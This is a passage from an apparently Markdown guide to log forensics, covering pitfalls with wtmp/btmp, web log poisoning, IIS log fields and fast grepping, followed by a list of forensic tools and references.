  rotation, and beware of year rollovers.
- **`last` reads wtmp, `lastb` reads btmp** and needs root. An empty `lastb` may mean btmp was
  never populated, not that there were no failures.
- Web logs can be **poisoned**: a User-Agent containing a newline or a fake log line. Never trust
  field boundaries derived from attacker-controlled strings.
- IIS logs are UTC by default and the field order varies per site -- read `#Fields:`.
- Do not grep a multi-gigabyte log with a Python loop when `LC_ALL=C grep -F` will do it 50x
  faster.

## Tools

`evtx_dump` (Rust) / `evtx_dump.py` (python-evtx), `EvtxECmd`, `chainsaw`, `hayabusa`,
`zircolite`, `DeepBlueCLI`, `Get-WinEvent`, `wevtutil`, `goaccess`, `jq`, `awk`, `ripgrep`,
`journalctl`, `ausearch`/`aureport`, `utmpdump`, `last`/`lastb`, `plaso` for merging everything.

## References

- The Sysmon schema (`sysmon -s`) documents every event ID and field name.
- `chainsaw --help`, `hayabusa help`, `EvtxECmd.exe --help` list the current flags.
